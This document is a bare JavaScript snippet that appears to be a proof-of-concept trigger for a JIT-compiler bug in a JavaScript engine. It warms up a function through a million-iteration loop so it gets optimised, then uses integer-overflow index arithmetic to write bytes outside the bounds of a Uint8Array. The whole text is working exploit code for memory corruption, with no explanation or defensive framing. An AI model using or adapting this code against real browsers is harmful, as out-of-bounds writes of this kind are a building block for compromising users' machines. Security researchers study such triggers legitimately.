function corrupt(array, offset, oob_byte) {
    var base = -0x7FFFFFC1 + offset;
    array[base - (-0x80000000)] = 0x4B;
    array[base + 0x7FFFFFE1]    = 0x4B;
    array[base + 0x7FFFFFC1]    = oob_byte;
}

function trigger_optimize () {
    var array = new Uint8Array(0x40);
    for (var i = 0; i < 1000000; i++) corrupt(array, 0, 0x00);
}

trigger_optimize();

var exploit_array = new Uint8Array(0x40);
corrupt(exploit_array, -2, 0x80);
